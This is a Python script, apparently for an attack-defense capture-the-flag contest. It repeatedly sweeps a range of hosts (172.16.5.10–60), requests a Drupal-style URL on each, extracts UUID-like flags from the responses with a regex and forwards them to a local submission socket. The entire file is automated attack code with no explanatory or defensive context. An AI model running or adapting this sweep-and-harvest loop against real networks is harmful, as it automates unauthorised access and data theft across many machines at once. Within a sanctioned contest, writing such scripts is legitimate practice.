import time
import requests
import re
import socket

url = '172.16.5.32:5066/?q=node/1&destination=node/1'


def submit(answer: str):
    print('[+] Sending flag')
    host = ('127.0.0.1', 6666)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(host)
    s.send(answer.encode())
    s.close()


while True:
    for d in range(10, 61):
        time.sleep(2.5)
        print('[+] Attack on ' + str(d))
        try:
            url = f'http://172.16.5.{d}:5066/?q=node/1&destination=node/1'
            r = requests.get(url, timeout=2)
            flag = re.search('........-....-....-....-............', r.text).group()
            submit(flag)
        except Exception as e:
            print(e)
            pass
    print('[+] One round finish')
    time.sleep(100)
